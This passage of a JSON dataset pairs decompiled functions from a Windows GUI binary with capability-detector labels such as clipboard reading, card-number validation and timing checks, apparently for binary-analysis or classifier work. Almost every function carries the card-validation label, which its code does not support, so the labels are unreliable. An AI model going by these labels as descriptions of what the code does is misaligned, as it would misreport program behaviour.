            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "read clipboard data"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004318e0(uint param_1, uint32_t param_2)\n\n{\n    int32_t *in_EAX;\n    uint32_t *in_FS_OFFSET;\n    uint32_t uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x4318f4;\n    (**(*in_EAX + 0x18))();\n    uStack24 = 0x431924;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    sub.user32.dll_GetClipboardData();\n    *in_FS_OFFSET = param_2 & 0xffff;\n    uStack24 = 0x43192b;\n    uStack28 = 0x431923;\n    (**(*in_EAX + 0x14))();\n    return;\n}\n",
        "token_count": 212
    },
    "00431bcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00431bcc(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0044a568();\n    *(in_EAX + 0x60) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 147
    },
    "00432310": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432310(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00432260();\n    (***0x492540)(uVar1);\n    return;\n}\n",
        "token_count": 87
    },
    "0043235c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043235c(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.00432260();\n    (***0x4924f8)(uVar1);\n    return;\n}\n",
        "token_count": 78
    },
    "0043286c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043286c(char param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack128;\n    uint uStack124;\n    uchar *puStack120;\n    uint uStack116;\n    uint *puStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    uint uStack100;\n    uint *puStack96;\n    uint uStack92;\n    uint uStack88;\n    int32_t var_44h;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    uint var_34h;\n    int32_t nLeftRect;\n    int32_t nTopRect;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    int32_t var_18h;\n    int32_t iStack24;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint hdc;\n    uint var_4h;\n    \n    uStack88 = 0xffffffec;\n    uStack92 = 0x432886;\n    var_4h = param_2;\n    uStack92 = fcn.00458568();\n    puStack96 = 0x43288c;\n    uVar1 = sub.user32.dll_GetWindowLongA();\n    if ((uVar1 & 0x200) != 0) {\n        puStack96 = &fcn.0043286c::nLeftRect;\n        uStack100 = 0x4328a1;\n        uStack100 = fcn.00458568();\n        iStack104 = 0x4328a7;\n        sub.user32.dll_GetWindowRect();\n        iStack104 = -nTopRect;\n        iStack108 = -nLeftRect;\n        puStack112 = &fcn.0043286c::nLeftRect;\n        uStack116 = 0x4328bc;\n        sub.user32.dll_OffsetRect();\n        uStack116 = 0x4328c4;\n        uStack116 = fcn.00458568();\n        puStack120 = 0x4328ca;\n        hdc = sub.user32.dll_GetWindowDC();\n        uStack124 = 0x4329c7;\n        uStack128 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff80;\n        var_18h = nLeftRect;\n        iStack24 = nTopRect;\n        var_10h = nRightRect;\n        var_ch = nBottomRect;\n        puStack120 = &stack0xfffffffc;\n        if (param_1 != '\\0') {\n            puStack120 = &stack0xfffffffc;\n            uVar2 = fcn.00458568(0xfffffff0);\n            uVar1 = sub.user32.dll_GetWindowLongA(uVar2);\n            if (((uVar1 & 0x100000) != 0) && ((uVar1 & 0x200000) != 0)) {\n                sub.user32.dll_GetSystemMetrics(2);\n                sub.user32.dll_GetSystemMetrics(3);\n                sub.user32.dll_InflateRect(&fcn.0043286c::var_18h, 0xfffffffe, 0xfffffffe);\n                fcn.00418438(&fcn.0043286c::var_44h, var_ch);\n                var_18h = var_44h;\n                iStack24 = iStack68;\n                var_10h = iStack64;\n                var_ch = iStack60;\n                uVar2 = sub.user32.dll_GetSysColorBrush(0xf);\n                sub.user32.dll_FillRect(hdc, &fcn.0043286c::var_18h, uVar2);\n            }\n        }\n        sub.gdi32.dll_ExcludeClipRect(hdc, nLeftRect + 2, nTopRect + 2, nRightRect + -2, nBottomRect + -2);\n        fcn.00432408();\n        uVar2 = 0;\n        fcn.0043235c(0, &fcn.0043286c::nLeftRect);\n        *in_FS_OFFSET = uVar2;\n        uVar2 = fcn.00458568(hdc, 0x4329ce);\n        sub.user32.dll_ReleaseDC(uVar2);\n        return;\n    }\n    return;\n}\n",
        "token_count": 951
    },
    "00434754": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00434754(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if ((*(in_EAX + 0x70) != 0) && (cVar1 = fcn.004047dc(),  cVar1 != '\\0')) {\n        fcn.004370fc();\n        fcn.004375e4();\n    }\n    if (*(in_EAX + 0x70) != 0) {\n        fcn.00438350();\n    }\n    fcn.00433ef8();\n    return;\n}\n",
        "token_count": 131
    },
    "00436114": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436114(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_154h;\n    uint var_bch;\n    uint var_b8h;\n    \n    var_154h = 0x154;\n    iVar1 = sub.user32.dll_SystemParametersInfoA(0x29, 0, &var_154h, 0);\n    if (iVar1 != 0) {\n        **(arg_8h + -4) = var_bch;\n        **(arg_8h + 8) = var_b8h;\n    }\n    return;\n}\n",
        "token_count": 136
    },
    "00436ef8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00436ef8(int32_t arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    (**(**(arg_8h + -8) + 8))();\n    uVar1 = (**(**(arg_8h + -0xc) + 0x14))();\n    *(arg_8h + -0x10) = uVar1;\n    iVar2 = (**(**(arg_8h + -0x14) + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            uVar1 = (**(**(arg_8h + -0x14) + 0x18))();\n            (**(**(arg_8h + -0x14) + 0x18))(uVar1);\n            (**(**(arg_8h + -8) + 0x3c))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.004055c8();\n    return;\n}\n",
        "token_count": 235
    },
    "00437994": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint fcn.00437994(void)\n\n{\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00433ef8();\n    return 0;\n}\n",
        "token_count": 62
    },
    "00437cd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar fcn.00437cd0(void)\n\n{\n    int16_t iVar1;\n    int32_t iVar2;\n    uchar uVar3;\n    \n    iVar1 = sub.user32.dll_GetKeyState(0xa5);\n    uVar3 = 0;\n    if ((iVar1 < 0) && (iVar2 = sub.user32.dll_GetKeyboardLayout(0),  uVar3 = *0x4904ec,  iVar2 != *0x4904e8)) {\n        fcn.00437b2c();\n        *0x4904e8 = iVar2;\n        uVar3 = *0x4904ec;\n    }\n    return uVar3;\n}\n",
        "token_count": 149
    },
    "00437d0c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00437d0c(void)\n\n{\n    uint32_t uVar1;\n    int16_t iVar2;\n    uint32_t *in_EAX;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    uVar4 = *in_EAX;\n    uVar1 = in_EAX[1];\n    uVar3 = uVar1 & 0xff;\n    if (uVar1 != 0) {\n        iVar2 = sub.user32.dll_GetKeyState(0x10, uVar4, uVar1, in_EAX[2], in_EAX[3]);\n        if (iVar2 < 0) {\n            uVar3 = uVar1 + 0x2000;\n        }\n        iVar2 = sub.user32.dll_GetKeyState(0x11);\n        if (iVar2 < 0) {\n            uVar3 = uVar3 + 0x4000;\n        }\n        if ((uVar4 & 0x20000000) != 0) {\n            uVar3 = uVar3 + 0x8000;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 252
    },
    "004390c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004390c0(uint param_1, uint *param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    \n    uVar1 = param_2[1];\n    *(in_EAX + 0x58) = *param_2;\n    *(in_EAX + 0x5c) = uVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "0043b890": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043b890(void)\n\n{\n    uint uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x490524;\n    puStack32 = &stack0xfffffffc;\n    puStack44 = &stack0xfffffffc;\n    *0x490524 = 0;\n    uStack36 = 0x43b941;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    *0x490520 = 1;\n    uStack48 = 0x43b903;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack52;\n    uVar2 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043b840, 0);\n    sub.user32.dll_EnumThreadWindows();\n    *in_FS_OFFSET = uVar2;\n    *in_FS_OFFSET = uStack52;\n    *0x490520 = 0;\n    *0x490524 = uVar1;\n    return;\n}\n",
        "token_count": 288
    },
    "0043baa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate gui resources"
        ],
        "decompiled_code": "\nuint64_t fcn.0043baa4(void)\n\n{\n    char in_AL;\n    uint uVar1;\n    code *pcVar2;\n    uint uStack12;\n    uchar uStack8;\n    \n    uStack12 = sub.user32.dll_GetActiveWindow();\n    uStack8 = 0;\n    if (in_AL == '\\0') {\n        pcVar2 = fcn.0043ba4c;\n        uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.0043ba4c, &uStack12);\n        sub.user32.dll_EnumThreadWindows(uVar1);\n    }\n    else {\n        pcVar2 = fcn.0043ba6c;\n        sub.user32.dll_EnumWindows(fcn.0043ba6c, &uStack12);\n    }\n    return CONCAT44(pcVar2, pcVar2) & 0xffffffff000000ff;\n}\n",
        "token_count": 196
    },
    "0043bd10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0043bd10(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd4;\n    uint *arg_ch;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x43bd81;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    iVar1 = fcn.0043bd00();\n    if (iVar1 == 0) {\n        var_8h = *(in_EAX + 8);\n        var_4h._0_1_ = 0xb;\n        arg_ch = &var_8h;\n        in_stack_ffffffd4 = 0;\n        fcn.00407550();\n        fcn.0040db28(in_stack_ffffffd4, arg_ch);\n        fcn.00404ec4();\n    }\n    *in_FS_OFFSET = in_stack_ffffffd4;\n    uStack36 = 0x43bd88;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 288
    },
    "0043bd90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0043bd90(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = in_ECX;\n    *(in_EAX + 0x18) = arg_8h;\n    *(in_EAX + 10) = 0x50;\n    *(in_EAX + 8) = 8;\n    *(in_EAX + 0x1c) = 1;\n    *(in_EAX + 0x20) = 10;\n    *(in_EAX + 0x40) = 4;\n    *(in_EAX + 0x3c) = 0xc;\n    *(in_EAX + 0x28) = 0xff000014;\n    *(in_EAX + 0x2c) = 1;\n    *(in_EAX + 0x44) = 1;\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 324
    },
    "0043c930": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043c930(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.004534a4();\n    *(in_EAX + 0x50) = *(in_EAX + 0x50) | *0x43c9a4;\n    uVar1 = fcn.0043bd90(0);\n    *(in_EAX + 0x250) = uVar1;\n    uVar2 = 1;\n    uVar1 = fcn.0043bd90(1);\n    *(in_EAX + 0x254) = uVar1;\n    *(in_EAX + 600) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 254
    },
    "0043cd1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043cd1c(uint param_1, int32_t *param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_stack_ffffffd0;\n    int32_t iVar6;\n    int32_t in_stack_ffffffd4;\n    int32_t iVar7;\n    int32_t in_stack_ffffffd8;\n    int32_t in_stack_ffffffdc;\n    int32_t iStack32;\n    int32_t iStack28;\n    \n    if (param_2 != NULL) {\n        (**(*param_2 + 0x44))();\n        uVar1 = *(*(in_EAX + 0x250) + 0x1a);\n        uVar2 = *(*(in_EAX + 0x254) + 0x1a);\n        fcn.00450294(in_stack_ffffffd0 - uVar1, in_stack_ffffffd4 - uVar2, in_stack_ffffffd8 + uVar1, \n                     in_stack_ffffffdc + uVar2);\n        fcn.00450344();\n        iVar5 = iStack32;\n        iVar7 = iStack28;\n        fcn.00450294();\n        fcn.00450344();\n        if (iVar5 < 0) {\n            fcn.0043c58c();\n        }\n        else {\n            iVar6 = iVar5;\n            iVar3 = fcn.00450180();\n            if (iVar3 < iStack32) {\n                iVar3 = iStack32;\n                iVar4 = fcn.00450180();\n                if (iVar4 < iStack32 - iVar5) {\n                    iVar3 = fcn.00450180();\n                    iVar3 = iVar3 + iVar6;\n                }\n                fcn.00450180(iVar6, iVar7, iVar3);\n                fcn.0043c58c();\n            }\n        }\n        if (iVar7 < 0) {\n            fcn.0043c58c();\n        }\n        else {\n            iVar5 = fcn.004501c4();\n            if (iVar5 < iStack28) {\n                iVar5 = fcn.004501c4();\n                if (iVar5 < iStack28 - iVar7) {\n                    fcn.004501c4();\n                }\n                fcn.004501c4();\n                fcn.0043c58c();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 561
    },
    "0043cf3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0043cf3c(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    in_EAX[0x97] = in_EAX[0x97] + 1;\n    uStack24 = 0x43cfa8;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    fcn.004569b8();\n    (**(*in_EAX + 0xe0))();\n    *in_FS_OFFSET = uStack28;\n    in_EAX[0x97] = in_EAX[0x97] + -1;\n    return;\n}\n",
        "token_count": 181
    },
    "0043d0f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043d0f4(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    var_ch = *(param_2 + 4);\n    uStack24 = 0x43d155;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    var_8h = param_2;\n    cVar1 = fcn.004047dc();\n    if (cVar1 == '\\0') {\n        *(var_8h + 4) = 1;\n    }\n    fcn.004578b4();\n    *in_FS_OFFSET = uStack28;\n    *(var_8h + 4) = var_ch;\n    return;\n}\n",
        "token_count": 222
    },
    "0043d184": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0043d184(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint in_stack_fffffea4;\n    uint *arg_ch;\n    uint uStack340;\n    uint uStack336;\n    uchar *puStack332;\n    uint uStack328;\n    uint uStack324;\n    uint uStack320;\n    uchar *puStack316;\n    uint uStack312;\n    uint uStack308;\n    uchar *puStack304;\n    uint var_114h;\n    uint var_110h;\n    uint *var_10h;\n    uint var_ch;\n    int32_t *var_5h;\n    \n    if (param_2 != '\\0') {\n        puStack304 = 0x43d1a2;\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    uStack308 = 0x43d2e8;\n    uStack312 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec8;\n    puStack316 = 0x43d1c4;\n    puStack304 = &stack0xfffffffc;\n    var_5h._0_1_ = param_2;\n    unique0x100000eb = in_EAX;\n    (**(***0x4927a0 + 0x14))();\n    uStack320 = 0x43d2c8;\n    uStack324 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffebc;\n    uStack328 = 0;\n    puStack332 = 0x43d1e3;\n    puStack316 = &stack0xfffffffc;\n    (**(*stack0xfffffff8 + 0xf0))();\n    puStack332 = 0x43d1eb;\n    iVar2 = fcn.00404528();\n    if ((iVar2 != *0x43a258) && ((*(stack0xfffffff8 + 7) & 0x10) == 0)) {\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) | 1;\n        uStack336 = 0x43d290;\n        uStack340 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffeac;\n        puStack332 = &stack0xfffffffc;\n        cVar1 = fcn.00419648();\n        if (cVar1 == '\\0') {\n            fcn.00404530();\n            var_10h = &fcn.0043d184::var_110h;\n            var_ch._0_1_ = 4;\n            arg_ch = &fcn.0043d184::var_10h;\n            in_stack_fffffea4 = 0;\n            fcn.00407550();\n            fcn.0040db28(in_stack_fffffea4, arg_ch);\n            fcn.00404ec4();\n        }\n        *in_FS_OFFSET = in_stack_fffffea4;\n        *(stack0xfffffff8 + 0xd6) = *(stack0xfffffff8 + 0xd6) & 0xfe;\n        return;\n    }\n    *in_FS_OFFSET = uStack328;\n    uStack320 = 0x43d2cf;\n    uStack324 = 0x43d2c7;\n    (**(***0x4927a0 + 0x18))();\n    return;\n}\n",
        "token_count": 792
    },
    "0043e1a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e1a8(code *arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t in_EDX;\n    int32_t var_8h;\n    uint var_4h;\n    \n    fcn.00458ad0(arg_8h, arg_ch);\n    if ((in_EAX == in_EDX) && (var_8h = fcn.00420584(),  -1 < var_8h + -1)) {\n        do {\n            fcn.00420558();\n            cVar1 = fcn.0040484c();\n            if (cVar1 == '\\0') {\n                (*arg_8h)();\n            }\n            var_8h = var_8h + -1;\n        } while (var_8h != 0);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "00441e94": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00441e94(int32_t arg_8h)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    int32_t in_ECX;\n    int32_t in_EDX;\n    uint32_t uVar2;\n    \n    uVar1 = (*in_EAX + in_ECX) - in_EDX;\n    uVar2 = uVar1 >> 0x1f;\n    if ((uVar1 ^ uVar2) - uVar2 < *(*(arg_8h + -4) + 0x34c)) {\n        *in_EAX = in_EDX - in_ECX;\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "00442a7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00442a7c(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x442ae9;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    cVar1 = (**(*in_EAX + 0xf4))();\n    if (cVar1 != '\\0') {\n        fcn.0040484c();\n        if ((cVar1 != '\\0') == true) {\n            fcn.00442bf0();\n        }\n    }\n    else {\n        in_EAX[0xa5] = 0;\n    }\n    *in_FS_OFFSET = uStack36;\n    return;\n}\n",
        "token_count": 202
    },
    "00443760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443760(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    \n    iVar1 = fcn.00456f1c();\n    *arg_8h = iVar1 == 0;\n    return;\n}\n",
        "token_count": 66
    },
    "004439dc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004439dc(void)\n\n{\n    uint uStack20;\n    \n    fcn.00443a44();\n    return uStack20;\n}\n",
        "token_count": 34
    },
    "004439f4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004439f4(void)\n\n{\n    int32_t iStack16;\n    int32_t iStack8;\n    \n    fcn.00443a44();\n    return iStack8 - iStack16;\n}\n",
        "token_count": 51
    },
    "00443a10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00443a10(void)\n\n{\n    uint uStack16;\n    \n    fcn.00443a44();\n    return uStack16;\n}\n",
        "token_count": 35
    },
    "00443a28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00443a28(void)\n\n{\n    int32_t iStack20;\n    int32_t iStack12;\n    \n    fcn.00443a44();\n    return iStack12 - iStack20;\n}\n",
        "token_count": 51
    },
    "00443a44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443a44(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    \n    uStack52 = 0x28;\n    (***0x492400)(*(in_EAX + 4));\n    *param_2 = &uStack52;\n    *(param_2 + 4) = uStack52;\n    *(param_2 + 8) = uStack48;\n    *(param_2 + 0xc) = uStack44;\n    return;\n}\n",
        "token_count": 135
    },
    "00443a74": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00443a74(uint param_1, uint *param_2)\n\n{\n    int32_t in_EAX;\n    uint auStack52 [3];\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    \n    auStack52[0] = 0x28;\n    (***0x492400)(*(in_EAX + 4), auStack52);\n    *param_2 = uStack40;\n    param_2[1] = uStack36;\n    param_2[2] = uStack32;\n    param_2[3] = uStack28;\n    return;\n}\n",
        "token_count": 147
    },
    "00444218": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00444218(uint param_1, int16_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint *puVar7;\n    uint auStack28 [3];\n    \n    puVar7 = auStack28;\n    if (param_2 != *(in_EAX + 0x44)) {\n        *(in_EAX + 0x44) = param_2;\n        if (param_2 == 0) {\n            sub.user32.dll_GetCursorPos(auStack28);\n            uVar1 = sub.user32.dll_WindowFromPoint(puVar7, auStack28[0]);\n            if (uVar1 != 0) {\n                iVar6 = 0;\n                uVar4 = uVar1;\n                iVar2 = sub.user32.dll_GetWindowThreadProcessId(uVar1, 0);\n                iVar3 = sub.kernel32.dll_GetCurrentThreadId_1();\n                if (iVar2 == iVar3) {\n                    uVar4 = sub.user32.dll_SendMessageA(uVar1, 0x84, 0, uVar4 & 0xffff | iVar6 << 0x10);\n                    sub.user32.dll_SendMessageA(uVar1, 0x20, uVar1, uVar4 & 0xffff | 0x2000000);\n                    return;\n                }\n            }\n        }\n        uVar5 = fcn.004441f0();\n        sub.user32.dll_SetCursor(uVar5);\n    }\n    *(in_EAX + 0x48) = *(in_EAX + 0x48) + 1;\n    return;\n}\n",
        "token_count": 392
    },
    "00444438": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00444438(char param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    uVar1 = 0;\n    if (param_1 == '\\x01') {\n        iVar2 = fcn.0043df2c();\n        uVar1 = fcn.0043df2c();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x02') {\n        iVar3 = fcn.0043df2c();\n        iVar2 = *(param_2 + 0x4c);\n        iVar4 = fcn.0043df2c();\n        uVar1 = iVar4 + *(in_EAX + 0x4c);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x03') {\n        iVar2 = fcn.0043df0c();\n        uVar1 = fcn.0043df0c();\n        uVar1 = uVar1 & 0xffffff00 | iVar2 < uVar1;\n    }\n    else if (param_1 == '\\x04') {\n        iVar3 = fcn.0043df0c();\n        iVar2 = *(param_2 + 0x48);\n        iVar4 = fcn.0043df0c();\n        uVar1 = iVar4 + *(in_EAX + 0x48);\n        uVar1 = uVar1 & 0xffffff00 | iVar3 + iVar2 < 